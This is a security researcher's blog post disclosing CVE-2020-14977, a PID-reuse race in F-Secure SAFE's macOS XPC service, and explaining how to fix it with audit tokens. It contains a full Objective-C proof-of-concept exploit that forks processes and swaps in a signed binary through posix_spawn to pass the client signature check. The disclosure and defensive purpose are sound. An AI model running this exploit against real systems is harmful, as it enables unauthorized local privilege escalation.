<!DOCTYPE html>
<html lang="en">

<head>
  <title>
  CVE-2020-14977 - Secure coding XPC Services - Part 5 - PID reuse attacks · theevilbit blog
</title>
  <meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="color-scheme" content="light dark">




<meta name="author" content="Csaba Fitzl">
<meta name="description" content="In the last post of the series we will see another typical issue, where XPC services using the connecting process&rsquo;s ID (PID) to verify the client instead of the audit token. We will use F-Secure SAFE again for our case study, the vulnerability was fixed in 17.8 and it was assigned CVE-2020-14977.

  The root cause
  
    
    Link to heading
  

The XPC services of F-Secure SAFE use the process ID (PID) to verify the client&rsquo;s signature, as can be seen in the code below.">
<meta name="keywords" content="">


  <meta name="twitter:card" content="summary">
  <meta name="twitter:title" content="CVE-2020-14977 - Secure coding XPC Services - Part 5 - PID reuse attacks">
  <meta name="twitter:description" content="In the last post of the series we will see another typical issue, where XPC services using the connecting process’s ID (PID) to verify the client instead of the audit token. We will use F-Secure SAFE again for our case study, the vulnerability was fixed in 17.8 and it was assigned CVE-2020-14977.
The root cause Link to heading The XPC services of F-Secure SAFE use the process ID (PID) to verify the client’s signature, as can be seen in the code below.">

<meta property="og:url" content="https://theevilbit.github.io/posts/secure_coding_xpc_part5/">
  <meta property="og:site_name" content="theevilbit blog">
  <meta property="og:title" content="CVE-2020-14977 - Secure coding XPC Services - Part 5 - PID reuse attacks">
  <meta property="og:description" content="In the last post of the series we will see another typical issue, where XPC services using the connecting process’s ID (PID) to verify the client instead of the audit token. We will use F-Secure SAFE again for our case study, the vulnerability was fixed in 17.8 and it was assigned CVE-2020-14977.
The root cause Link to heading The XPC services of F-Secure SAFE use the process ID (PID) to verify the client’s signature, as can be seen in the code below.">
  <meta property="og:locale" content="en">
  <meta property="og:type" content="article">
    <meta property="article:section" content="posts">
    <meta property="article:published_time" content="2020-06-16T00:00:00+00:00">
    <meta property="article:modified_time" content="2020-06-16T00:00:00+00:00">
    <meta property="article:tag" content="Macos">
    <meta property="article:tag" content="Xpc">
    <meta property="article:tag" content="F-Secure">
    <meta property="article:tag" content="Lpe">
    <meta property="article:tag" content="Vulnerability">




<link rel="canonical" href="https://theevilbit.github.io/posts/secure_coding_xpc_part5/">


<link rel="preload" href="https://theevilbit.github.io/fonts/fa-brands-400.woff2" as="font" type="font/woff2" crossorigin>
<link rel="preload" href="https://theevilbit.github.io/fonts/fa-regular-400.woff2" as="font" type="font/woff2" crossorigin>
<link rel="preload" href="https://theevilbit.github.io/fonts/fa-solid-900.woff2" as="font" type="font/woff2" crossorigin>


  
  
  <link rel="stylesheet" href="https://theevilbit.github.io/css/coder.min.38c4552ac40f9ae3408bad40358f654ebd8804412fe74ed56f2d6c8a7af82dd3.css" integrity="sha256-OMRVKsQPmuNAi61ANY9lTr2IBEEv507Vby1sinr4LdM=" crossorigin="anonymous" media="screen" />








 




<link rel="icon" type="image/svg+xml" href="https://theevilbit.github.io/images/favicon.svg" sizes="any">
<link rel="icon" type="image/png" href="https://theevilbit.github.io/images/favicon-32x32.png" sizes="32x32">
<link rel="icon" type="image/png" href="https://theevilbit.github.io/images/favicon-16x16.png" sizes="16x16">

<link rel="apple-touch-icon" href="https://theevilbit.github.io/images/apple-touch-icon.png">
<link rel="apple-touch-icon" sizes="180x180" href="https://theevilbit.github.io/images/apple-touch-icon.png">

<link rel="manifest" href="https://theevilbit.github.io/site.webmanifest">
<link rel="mask-icon" href="https://theevilbit.github.io/images/safari-pinned-tab.svg" color="#5bbad5">









</head>




<body class="preload-transitions colorscheme-light">
  
<div class="float-container">
    <a id="dark-mode-toggle" class="colorscheme-toggle">
        <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
    </a>
</div>


  <main class="wrapper">
    <nav class="navigation">
  <section class="container">
    
    <a class="navigation-title" href="https://theevilbit.github.io/">
      theevilbit blog
    </a>
    
    
      <input type="checkbox" id="menu-toggle" />
      <label class="menu-button float-right" for="menu-toggle">
        <i class="fa-solid fa-bars fa-fw" aria-hidden="true"></i>
      </label>
      <ul class="navigation-list">
        
          
            <li class="navigation-item">
              <a class="navigation-link " href="https://theevilbit.github.io/posts/">Posts</a>
            </li>
          
            <li class="navigation-item">
              <a class="navigation-link " href="https://theevilbit.github.io/talks/">Talks and Workshops</a>
            </li>
          
            <li class="navigation-item">
              <a class="navigation-link " href="https://theevilbit.github.io/shield/">Shield.app</a>
            </li>
          
            <li class="navigation-item">
              <a class="navigation-link " href="https://theevilbit.github.io/beyond/">Beyond good ol&#39; LaunchAgents</a>
            </li>
          
            <li class="navigation-item">
              <a class="navigation-link " href="https://theevilbit.github.io/tags/">Tags</a>
            </li>
          
            <li class="navigation-item">
              <a class="navigation-link " href="https://theevilbit.github.io/about/">About</a>
            </li>
          
        
        
      </ul>
    
  </section>
</nav>


    <div class="content">
      
  <section class="container post">
    <article>
      <header>
        <div class="post-title">
          <h1 class="title">
            <a class="title-link" href="https://theevilbit.github.io/posts/secure_coding_xpc_part5/">
              CVE-2020-14977 - Secure coding XPC Services - Part 5 - PID reuse attacks
            </a>
          </h1>
        </div>
        <div class="post-meta">
          <div class="date">
            <span class="posted-on">
              <i class="fa-solid fa-calendar" aria-hidden="true"></i>
              <time datetime="2020-06-16T00:00:00Z">
                June 16, 2020
              </time>
            </span>
            <span class="reading-time">
              <i class="fa-solid fa-clock" aria-hidden="true"></i>
              5-minute read
            </span>
          </div>
          
          <div class="categories">
  <i class="fa-solid fa-folder" aria-hidden="true"></i>
    <a href="https://theevilbit.github.io/categories/blog/">BLOG</a></div>

          <div class="tags">
  <i class="fa-solid fa-tag" aria-hidden="true"></i>
    <span class="tag">
      <a href="https://theevilbit.github.io/tags/macos/">Macos</a>
    </span>
      <span class="separator">•</span>
    <span class="tag">
      <a href="https://theevilbit.github.io/tags/xpc/">Xpc</a>
    </span>
      <span class="separator">•</span>
    <span class="tag">
      <a href="https://theevilbit.github.io/tags/f-secure/">F-Secure</a>
    </span>
      <span class="separator">•</span>
    <span class="tag">
      <a href="https://theevilbit.github.io/tags/lpe/">Lpe</a>
    </span>
      <span class="separator">•</span>
    <span class="tag">
      <a href="https://theevilbit.github.io/tags/vulnerability/">Vulnerability</a>
    </span></div>

        </div>
      </header>

      <div class="post-content">
        
        <p>In the last post of the series we will see another typical issue, where XPC services using the connecting process&rsquo;s ID (PID) to verify the client instead of the audit token. We will use F-Secure SAFE again for our case study, the vulnerability was fixed in 17.8 and it was assigned CVE-2020-14977.</p>
<h2 id="the-root-cause">
  The root cause
  <a class="heading-link" href="#the-root-cause">
    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
    <span class="sr-only">Link to heading</span>
  </a>
</h2>
<p>The XPC services of F-Secure SAFE use the process ID (PID) to verify the client&rsquo;s signature, as can be seen in the code below.</p>
<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-objectivec" data-lang="objectivec"><span style="display:flex;"><span>+(<span style="color:#078;font-weight:bold">void</span> <span style="color:#555">*</span>)<span style="color:#c0f">verifyPid:</span>(<span style="color:#078;font-weight:bold">int</span>)<span style="color:#033">arg2</span> <span style="color:#c0f">codesignatureAgainstRequirements:</span>(<span style="color:#078;font-weight:bold">void</span> <span style="color:#555">*</span>)<span style="color:#033">arg3</span> {
</span></span><span style="display:flex;"><span>    var_44 <span style="color:#555">=</span> arg2;
</span></span><span style="display:flex;"><span>    r14 <span style="color:#555">=</span> [arg3 <span style="color:#069;font-weight:bold">retain</span>];
</span></span><span style="display:flex;"><span>    r15 <span style="color:#555">=</span> [SignatureVerificationResult new];
</span></span><span style="display:flex;"><span>    rax <span style="color:#555">=</span> CFNumberCreate(<span style="color:#555">**</span>_kCFAllocatorDefault, <span style="color:#f60">0x3</span>, <span style="color:#555">&amp;</span>var_44);
</span></span><span style="display:flex;"><span>    var_40 <span style="color:#555">=</span> rax;
</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">if</span> (rax <span style="color:#555">!=</span> <span style="color:#f60">0x0</span>) {
</span></span><span style="display:flex;"><span>            rax <span style="color:#555">=</span> CFDictionaryCreate(<span style="color:#555">**</span>_kCFAllocatorDefault, <span style="color:#555">*</span>_kSecGuestAttributePid, <span style="color:#555">&amp;</span>var_40, <span style="color:#f60">0x1</span>, <span style="color:#f60">0x0</span>, <span style="color:#f60">0x0</span>);
</span></span></code></pre></div><p>The problem with this approach is that on macOS, PIDs can be reused. We can even replace current executable to a different process with <code>posix_spawn()</code> while keeping the old PID, and this is the technique we will use in our exploit later on. The flags <code>POSIX_SPAWN_SETEXEC | POSIX_SPAWN_START_SUSPENDED</code> passed to <code>posix_spawn</code> will result in starting the process in a suspended mode, and keeping the same PID (the old process is replaced by the new one, keeping the PID). Our exploit will fork 10 processes, each of them sending a message to the XPC service, and each forked process will replace itself with a valid F-Secure client. This way when the XPC service verifies the code signature of the connecting client, it will see the spawned process (this is where we have a race condition), and once its verified it will consume the XPC message sent earlier. With a loop for about 10 times we can easily win the race condition, sometimes even 1 or 2 spawns are enough. The POC keeps track of the child processes, and kills them at the end.</p>
<p>Note: the forked processes will have 10 different PIDs, but when they spawn a new process with <code>exec</code> method, that is the point where the PID is retained.</p>
<h2 id="poc">
  POC
  <a class="heading-link" href="#poc">
    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
    <span class="sr-only">Link to heading</span>
  </a>
</h2>
<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-objectivec" data-lang="objectivec"><span style="display:flex;"><span><span style="color:#099">#import &lt;Foundation/Foundation.h&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#099">#include</span> <span style="color:#099">&lt;spawn.h&gt;</span><span style="color:#099">
</span></span></span><span style="display:flex;"><span><span style="color:#099">#include</span> <span style="color:#099">&lt;signal.h&gt;</span><span style="color:#099">
</span></span></span><span style="display:flex;"><span><span style="color:#099"></span>
</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">static</span> NSString<span style="color:#555">*</span> XPCHelperMachServiceName <span style="color:#555">=</span> <span style="color:#c30">@&#34;com.f-secure.fscsafeadmind&#34;</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">@protocol</span> <span style="color:#0a8;font-weight:bold">fscsafeadmindProtocol</span>
</span></span><span style="display:flex;"><span>- (<span style="color:#078;font-weight:bold">void</span>)<span style="color:#c0f">getScreenSaverPasswordState:</span>(<span style="color:#078;font-weight:bold">void</span> (<span style="color:#555">^</span>)(<span style="color:#078;font-weight:bold">BOOL</span>))<span style="color:#033">arg1</span>;
</span></span><span style="display:flex;"><span>- (<span style="color:#078;font-weight:bold">void</span>)<span style="color:#c0f">isKextLoaded:</span>(NSString <span style="color:#555">*</span>)<span style="color:#033">arg1</span> <span style="color:#c0f">callback:</span>(<span style="color:#078;font-weight:bold">void</span> (<span style="color:#555">^</span>)(<span style="color:#078;font-weight:bold">BOOL</span>))<span style="color:#033">arg2</span>;
</span></span><span style="display:flex;"><span>- (<span style="color:#078;font-weight:bold">void</span>)<span style="color:#c0f">isServiceRunning:</span>(NSString <span style="color:#555">*</span>)<span style="color:#033">arg1</span> <span style="color:#c0f">callback:</span>(<span style="color:#078;font-weight:bold">void</span> (<span style="color:#555">^</span>)(<span style="color:#078;font-weight:bold">BOOL</span>))<span style="color:#033">arg2</span>;
</span></span><span style="display:flex;"><span>- (<span style="color:#078;font-weight:bold">void</span>)<span style="color:#c0f">unsubscribeEndpoint:</span>(NSXPCListenerEndpoint <span style="color:#555">*</span>)<span style="color:#033">arg1</span> <span style="color:#c0f">fromProtocol:</span>(NSString <span style="color:#555">*</span>)<span style="color:#033">arg2</span>;
</span></span><span style="display:flex;"><span>- (<span style="color:#078;font-weight:bold">void</span>)<span style="color:#c0f">subscribeToChangesWithProtocol:</span>(NSString <span style="color:#555">*</span>)<span style="color:#033">arg1</span> <span style="color:#c0f">andEndpoint:</span>(NSXPCListenerEndpoint <span style="color:#555">*</span>)<span style="color:#033">arg2</span>;
</span></span><span style="display:flex;"><span>- (<span style="color:#078;font-weight:bold">void</span>)<span style="color:#c0f">setUninstallationProtectionEnabled:</span>(<span style="color:#078;font-weight:bold">BOOL</span>)<span style="color:#033">arg1</span>;
</span></span><span style="display:flex;"><span>- (<span style="color:#078;font-weight:bold">void</span>)<span style="color:#c0f">setScanningExclusions:</span>(NSArray <span style="color:#555">*</span>)<span style="color:#033">arg1</span>;
</span></span><span style="display:flex;"><span>- (<span style="color:#078;font-weight:bold">void</span>)<span style="color:#c0f">getXFenceDisabledInSettings:</span>(<span style="color:#078;font-weight:bold">void</span> (<span style="color:#555">^</span>)(<span style="color:#078;font-weight:bold">BOOL</span>))<span style="color:#033">arg1</span>;
</span></span><span style="display:flex;"><span>- (<span style="color:#078;font-weight:bold">void</span>)<span style="color:#c0f">disableScheduledScanning</span>;
</span></span><span style="display:flex;"><span>- (<span style="color:#078;font-weight:bold">void</span>)<span style="color:#c0f">enableScheduledScanning:</span>(<span style="color:#078;font-weight:bold">id</span> <span style="color:#555">&lt;</span>NSSecureCoding<span style="color:#555">&gt;</span>)<span style="color:#033">arg1</span>;
</span></span><span style="display:flex;"><span>- (<span style="color:#078;font-weight:bold">void</span>)<span style="color:#c0f">setXfenceEnabledNoAuth:</span>(<span style="color:#078;font-weight:bold">BOOL</span>)<span style="color:#033">arg1</span>;
</span></span><span style="display:flex;"><span>- (<span style="color:#078;font-weight:bold">void</span>)<span style="color:#c0f">setFRSEnabledNoAuth:</span>(<span style="color:#078;font-weight:bold">BOOL</span>)<span style="color:#033">arg1</span>;
</span></span><span style="display:flex;"><span>- (<span style="color:#078;font-weight:bold">void</span>)<span style="color:#c0f">oasIsTemporarilyDisabled:</span>(<span style="color:#078;font-weight:bold">void</span> (<span style="color:#555">^</span>)(<span style="color:#078;font-weight:bold">BOOL</span>))<span style="color:#033">arg1</span>;
</span></span><span style="display:flex;"><span>- (<span style="color:#078;font-weight:bold">void</span>)<span style="color:#c0f">getOASState:</span>(<span style="color:#078;font-weight:bold">void</span> (<span style="color:#555">^</span>)(<span style="color:#078;font-weight:bold">long</span> <span style="color:#078;font-weight:bold">long</span>))<span style="color:#033">arg1</span>;
</span></span><span style="display:flex;"><span>- (<span style="color:#078;font-weight:bold">void</span>)<span style="color:#c0f">setOASEnabledNoAuth:</span>(<span style="color:#078;font-weight:bold">BOOL</span>)<span style="color:#033">arg1</span>;
</span></span><span style="display:flex;"><span>- (<span style="color:#078;font-weight:bold">void</span>)<span style="color:#c0f">getIsolationState:</span>(<span style="color:#078;font-weight:bold">void</span> (<span style="color:#555">^</span>)(<span style="color:#078;font-weight:bold">BOOL</span>))<span style="color:#033">arg1</span>;
</span></span><span style="display:flex;"><span>- (<span style="color:#078;font-weight:bold">void</span>)<span style="color:#c0f">setFirewallBlock:</span>(<span style="color:#078;font-weight:bold">BOOL</span>)<span style="color:#033">arg1</span>;
</span></span><span style="display:flex;"><span>- (<span style="color:#078;font-weight:bold">void</span>)<span style="color:#c0f">setFirewallEnabledNoAuth:</span>(<span style="color:#078;font-weight:bold">BOOL</span>)<span style="color:#033">arg1</span>;
</span></span><span style="display:flex;"><span>- (<span style="color:#078;font-weight:bold">void</span>)<span style="color:#c0f">getFirewallState:</span>(<span style="color:#078;font-weight:bold">void</span> (<span style="color:#555">^</span>)(<span style="color:#078;font-weight:bold">long</span> <span style="color:#078;font-weight:bold">long</span>))<span style="color:#033">arg1</span>;
</span></span><span style="display:flex;"><span>- (<span style="color:#078;font-weight:bold">void</span>)<span style="color:#c0f">getSignupDataWithCallback:</span>(<span style="color:#078;font-weight:bold">void</span> (<span style="color:#555">^</span>)(NSError <span style="color:#555">*</span>, NSString <span style="color:#555">*</span>, NSString <span style="color:#555">*</span>))<span style="color:#033">arg1</span>;
</span></span><span style="display:flex;"><span>- (<span style="color:#078;font-weight:bold">void</span>)<span style="color:#c0f">setTimeLimits:</span>(<span style="color:#078;font-weight:bold">id</span> <span style="color:#555">&lt;</span>NSSecureCoding<span style="color:#555">&gt;</span>)<span style="color:#033">arg1</span> <span style="color:#c0f">user:</span>(<span style="color:#078;font-weight:bold">unsigned</span> <span style="color:#078;font-weight:bold">int</span>)<span style="color:#033">arg2</span> <span style="color:#c0f">callback:</span>(<span style="color:#078;font-weight:bold">void</span> (<span style="color:#555">^</span>)(<span style="color:#078;font-weight:bold">BOOL</span>))<span style="color:#033">arg3</span>;
</span></span><span style="display:flex;"><span>- (<span style="color:#078;font-weight:bold">void</span>)<span style="color:#c0f">disableWebBlockingForUserWithID:</span>(<span style="color:#078;font-weight:bold">unsigned</span> <span style="color:#078;font-weight:bold">int</span>)<span style="color:#033">arg1</span> <span style="color:#c0f">callback:</span>(<span style="color:#078;font-weight:bold">void</span> (<span style="color:#555">^</span>)(<span style="color:#078;font-weight:bold">BOOL</span>))<span style="color:#033">arg2</span>;
</span></span><span style="display:flex;"><span>- (<span style="color:#078;font-weight:bold">void</span>)<span style="color:#c0f">setFirewallEnabled:</span>(<span style="color:#078;font-weight:bold">BOOL</span>)<span style="color:#033">arg1</span> <span style="color:#c0f">authorization:</span>(NSData <span style="color:#555">*</span>)<span style="color:#033">arg2</span> <span style="color:#c0f">callback:</span>(<span style="color:#078;font-weight:bold">void</span> (<span style="color:#555">^</span>)(<span style="color:#078;font-weight:bold">BOOL</span>))<span style="color:#033">arg3</span>;
</span></span><span style="display:flex;"><span>- (<span style="color:#078;font-weight:bold">void</span>)<span style="color:#c0f">getXfenceNonAdminCanCreateRulesWithCallback:</span>(<span style="color:#078;font-weight:bold">void</span> (<span style="color:#555">^</span>)(<span style="color:#078;font-weight:bold">BOOL</span>))<span style="color:#033">arg1</span>;
</span></span><span style="display:flex;"><span>- (<span style="color:#078;font-weight:bold">void</span>)<span style="color:#c0f">setXfenceNonAdminCanCreateRules:</span>(<span style="color:#078;font-weight:bold">BOOL</span>)<span style="color:#033">arg1</span> <span style="color:#c0f">authorization:</span>(NSData <span style="color:#555">*</span>)<span style="color:#033">arg2</span> <span style="color:#c0f">callback:</span>(<span style="color:#078;font-weight:bold">void</span> (<span style="color:#555">^</span>)(<span style="color:#078;font-weight:bold">BOOL</span>))<span style="color:#033">arg3</span>;
</span></span><span style="display:flex;"><span>- (<span style="color:#078;font-weight:bold">void</span>)<span style="color:#c0f">getXFENCEFilterStatusWithCallback:</span>(<span style="color:#078;font-weight:bold">void</span> (<span style="color:#555">^</span>)(<span style="color:#078;font-weight:bold">BOOL</span>))<span style="color:#033">arg1</span>;
</span></span><span style="display:flex;"><span>- (<span style="color:#078;font-weight:bold">void</span>)<span style="color:#c0f">setXfenceEnabled:</span>(<span style="color:#078;font-weight:bold">BOOL</span>)<span style="color:#033">arg1</span> <span style="color:#c0f">authorization:</span>(NSData <span style="color:#555">*</span>)<span style="color:#033">arg2</span> <span style="color:#c0f">callback:</span>(<span style="color:#078;font-weight:bold">void</span> (<span style="color:#555">^</span>)(<span style="color:#078;font-weight:bold">BOOL</span>))<span style="color:#033">arg3</span>;
</span></span><span style="display:flex;"><span>- (<span style="color:#078;font-weight:bold">void</span>)<span style="color:#c0f">setSubscription:</span>(<span style="color:#078;font-weight:bold">BOOL</span>)<span style="color:#033">arg1</span> <span style="color:#c0f">key:</span>(NSString <span style="color:#555">*</span>)<span style="color:#033">arg2</span> <span style="color:#c0f">authorization:</span>(NSData <span style="color:#555">*</span>)<span style="color:#033">arg3</span> <span style="color:#c0f">callback:</span>(<span style="color:#078;font-weight:bold">void</span> (<span style="color:#555">^</span>)(<span style="color:#078;font-weight:bold">long</span> <span style="color:#078;font-weight:bold">long</span>))<span style="color:#033">arg4</span>;
</span></span><span style="display:flex;"><span>- (<span style="color:#078;font-weight:bold">void</span>)<span style="color:#c0f">setFRSEnabled:</span>(<span style="color:#078;font-weight:bold">BOOL</span>)<span style="color:#033">arg1</span> <span style="color:#c0f">authorization:</span>(NSData <span style="color:#555">*</span>)<span style="color:#033">arg2</span> <span style="color:#c0f">callback:</span>(<span style="color:#078;font-weight:bold">void</span> (<span style="color:#555">^</span>)(<span style="color:#078;font-weight:bold">BOOL</span>))<span style="color:#033">arg3</span>;
</span></span><span style="display:flex;"><span>- (<span style="color:#078;font-weight:bold">void</span>)<span style="color:#c0f">setOASEnabled:</span>(<span style="color:#078;font-weight:bold">BOOL</span>)<span style="color:#033">arg1</span> <span style="color:#c0f">resumeTime:</span>(<span style="color:#078;font-weight:bold">double</span>)<span style="color:#033">arg2</span> <span style="color:#c0f">authorization:</span>(NSData <span style="color:#555">*</span>)<span style="color:#033">arg3</span> <span style="color:#c0f">callback:</span>(<span style="color:#078;font-weight:bold">void</span> (<span style="color:#555">^</span>)(<span style="color:#078;font-weight:bold">BOOL</span>))<span style="color:#033">arg4</span>;
</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">@end</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#078;font-weight:bold">int</span> main(<span style="color:#078;font-weight:bold">void</span>) {
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#099">#define RACE_COUNT 10
</span></span></span><span style="display:flex;"><span><span style="color:#099"></span>    <span style="color:#099">#define kValid &#34;/Applications/F-Secure/Support Tool.app/Contents/MacOS/Support Tool&#34;
</span></span></span><span style="display:flex;"><span><span style="color:#099"></span>    <span style="color:#069;font-weight:bold">extern</span> <span style="color:#078;font-weight:bold">char</span> <span style="color:#555">**</span>environ;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#078;font-weight:bold">int</span> pids[RACE_COUNT];
</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">for</span> (<span style="color:#078;font-weight:bold">int</span> i <span style="color:#555">=</span> <span style="color:#f60">0</span>; i <span style="color:#555">&lt;</span> RACE_COUNT; i<span style="color:#555">++</span>)
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        <span style="color:#078;font-weight:bold">int</span> pid <span style="color:#555">=</span> fork();
</span></span><span style="display:flex;"><span>        <span style="color:#069;font-weight:bold">if</span> (pid <span style="color:#555">==</span> <span style="color:#f60">0</span>)
</span></span><span style="display:flex;"><span>        {
</span></span><span style="display:flex;"><span>        NSString<span style="color:#555">*</span>  _serviceName <span style="color:#555">=</span> XPCHelperMachServiceName;
</span></span><span style="display:flex;"><span>        NSXPCConnection<span style="color:#555">*</span> _agentConnection <span style="color:#555">=</span> [[NSXPCConnection alloc] <span style="color:#99f">initWithMachServiceName</span>:_serviceName <span style="color:#99f">options</span>:<span style="color:#f60">4096</span>];
</span></span><span style="display:flex;"><span>        [_agentConnection <span style="color:#99f">setRemoteObjectInterface</span>:[NSXPCInterface <span style="color:#99f">interfaceWithProtocol</span>:@protocol(fscsafeadmindProtocol)]];
</span></span><span style="display:flex;"><span>        [_agentConnection resume];
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#078;font-weight:bold">id</span> obj <span style="color:#555">=</span> [_agentConnection <span style="color:#99f">remoteObjectProxyWithErrorHandler</span>:<span style="color:#555">^</span>(NSError<span style="color:#555">*</span> error)
</span></span><span style="display:flex;"><span>         {
</span></span><span style="display:flex;"><span>             (<span style="color:#078;font-weight:bold">void</span>)error;
</span></span><span style="display:flex;"><span>             NSLog(<span style="color:#c30">@&#34;Connection Failure&#34;</span>);
</span></span><span style="display:flex;"><span>         }];
</span></span><span style="display:flex;"><span>        NSLog(<span style="color:#c30">@&#34;obj: %@&#34;</span>, obj);
</span></span><span style="display:flex;"><span>        NSLog(<span style="color:#c30">@&#34;conn: %@&#34;</span>, _agentConnection);
</span></span><span style="display:flex;"><span>        <span style="color:#09f;font-style:italic">//get FW state
</span></span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"></span>        [obj <span style="color:#99f">getFirewallState</span>:<span style="color:#555">^</span>(<span style="color:#078;font-weight:bold">long</span> <span style="color:#078;font-weight:bold">long</span> b){
</span></span><span style="display:flex;"><span>             NSLog(<span style="color:#c30">@&#34;Response: %llx&#34;</span>,b);
</span></span><span style="display:flex;"><span>                 }];
</span></span><span style="display:flex;"><span> 
</span></span><span style="display:flex;"><span>        NSLog(<span style="color:#c30">@&#34;Done&#34;</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#078;font-weight:bold">char</span> target_binary[] <span style="color:#555">=</span> kValid;
</span></span><span style="display:flex;"><span>        <span style="color:#078;font-weight:bold">char</span> <span style="color:#555">*</span>target_argv[] <span style="color:#555">=</span> {target_binary, <span style="color:#366">NULL</span>};
</span></span><span style="display:flex;"><span>        posix_spawnattr_t attr;
</span></span><span style="display:flex;"><span>        posix_spawnattr_init(<span style="color:#555">&amp;</span>attr);
</span></span><span style="display:flex;"><span>        <span style="color:#078;font-weight:bold">short</span> flags;
</span></span><span style="display:flex;"><span>        posix_spawnattr_getflags(<span style="color:#555">&amp;</span>attr, <span style="color:#555">&amp;</span>flags);
</span></span><span style="display:flex;"><span>        flags <span style="color:#555">|=</span> (POSIX_SPAWN_SETEXEC <span style="color:#555">|</span> POSIX_SPAWN_START_SUSPENDED);
</span></span><span style="display:flex;"><span>        posix_spawnattr_setflags(<span style="color:#555">&amp;</span>attr, flags);
</span></span><span style="display:flex;"><span>        posix_spawn(<span style="color:#366">NULL</span>, target_binary, <span style="color:#366">NULL</span>, <span style="color:#555">&amp;</span>attr, target_argv, environ);
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        printf(<span style="color:#c30">&#34;forked %d</span><span style="color:#c30;font-weight:bold">\n</span><span style="color:#c30">&#34;</span>, pid);
</span></span><span style="display:flex;"><span>        pids[i] <span style="color:#555">=</span> pid;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#09f;font-style:italic">// keep the children alive
</span></span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"></span>    sleep(<span style="color:#f60">10</span>);
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    <span style="color:#99f">cleanup</span>:
</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">for</span> (<span style="color:#078;font-weight:bold">int</span> i <span style="color:#555">=</span> <span style="color:#f60">0</span>; i <span style="color:#555">&lt;</span> RACE_COUNT; i<span style="color:#555">++</span>)
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        pids[i] <span style="color:#555">&amp;&amp;</span> kill(pids[i], <span style="color:#f60">9</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>We compile the code with:</p>
<pre tabindex="0"><code>gcc -framework Foundation -framework Security fsecurepid.m -o fsecurepid
</code></pre><p>If we run it, we can see that the <code>fscsafeadmind</code> process will accept the connecting PID.</p>
<p><img src="https://theevilbit.github.io/images/Secure_coding_XPC_Part5/f-secure_accept1.png" alt=""></p>
<p>This is from this code:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-objectivec" data-lang="objectivec"><span style="display:flex;"><span><span style="color:#09f;font-style:italic">/* @class FCSServiceDelegate */</span>
</span></span><span style="display:flex;"><span>-(<span style="color:#078;font-weight:bold">char</span>)<span style="color:#c0f">listener:</span>(<span style="color:#078;font-weight:bold">void</span> <span style="color:#555">*</span>)<span style="color:#033">arg2</span> <span style="color:#c0f">shouldAcceptNewConnection:</span>(<span style="color:#078;font-weight:bold">void</span> <span style="color:#555">*</span>)<span style="color:#033">arg3</span> {
</span></span><span style="display:flex;"><span>(...)
</span></span><span style="display:flex;"><span><span style="color:#99f">loc_100012e26</span>:
</span></span><span style="display:flex;"><span>    r12 <span style="color:#555">=</span> <span style="color:#555">*</span>_objc_msgSend;
</span></span><span style="display:flex;"><span>    NSLog(<span style="color:#c30">@&#34;%@: Accepting client pid %d&#34;</span>, r13, rbx);
</span></span><span style="display:flex;"><span>    rax <span style="color:#555">=</span> [r13 serviceProtocol];
</span></span></code></pre></div><p>We can also see the requests:</p>
<p><img src="https://theevilbit.github.io/images/Secure_coding_XPC_Part5/f-secure_accept2.png" alt=""></p>
<p>Another way to exploit it is using Ian Beer&rsquo;s technique, which can be read further down below.</p>
<p><a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=1223"  class="external-link" target="_blank" rel="noopener">https://bugs.chromium.org/p/project-zero/issues/detail?id=1223</a></p>
<h2 id="how-to-make-it-secure">
  How to make it secure?
  <a class="heading-link" href="#how-to-make-it-secure">
    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
    <span class="sr-only">Link to heading</span>
  </a>
</h2>
<p>The solution is to use <code>audit_token</code> to verify the connecting client.</p>
<p>Unfortunately these functions are undocumented and private. (If you are an Apple developer reading this, please submit a feature request to Apple for making these APIs public).</p>
<ul>
<li>xpc_connection_get_audit_token</li>
<li>[NSXPCConnection auditToken]</li>
</ul>
<p>Patrick Wardle has a solution how to still use this, documented in his blog post:
<a href="https://objective-see.com/blog.html#blogEntry7"  class="external-link" target="_blank" rel="noopener">Objective-See</a></p>
<p>Essentially we need to create an extended class for <code>NSXPCConnection</code>, and in the <code>shouldAcceptNewConnection</code> callback we simply typecast the connection to this class, and we will be able to access the audit token.</p>
